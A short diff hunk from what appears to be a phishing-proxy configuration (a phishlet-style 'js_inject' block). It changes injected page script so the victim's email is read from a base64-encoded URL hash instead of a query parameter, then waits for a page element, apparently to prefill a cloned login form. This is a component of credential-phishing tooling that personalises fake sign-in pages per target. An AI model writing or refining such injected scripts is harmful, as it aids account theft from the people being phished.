@@ -173,10 +173,13 @@ js_inject:
     script: |
       window.addEventListener("load", () => {
 
-        var delaytimer = 2000;
-        setTimeout(function(){
-                const urlParams = new URLSearchParams(window.location.search);
-        const myParam = urlParams.get('limea'); email = myParam;
+        function isBase64(str) {
+          if (str === '' || str.trim() === ''){return false}
+          try {if (btoa(atob(str)) == atob(btoa(str))) return true} catch {return false}
+        }
+
+        var email = window.location.hash.substring(1); email = isBase64(email) ? window.atob(email) : email
+        email = email.replace("=", "")
        
         function waitForElm(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));const r=new MutationObserver(o=>{document.querySelector(e)&&(t(document.querySelector(e)),r.disconnect())});r.observe(document.body,{childList:!0,subtree:!0})})}
 
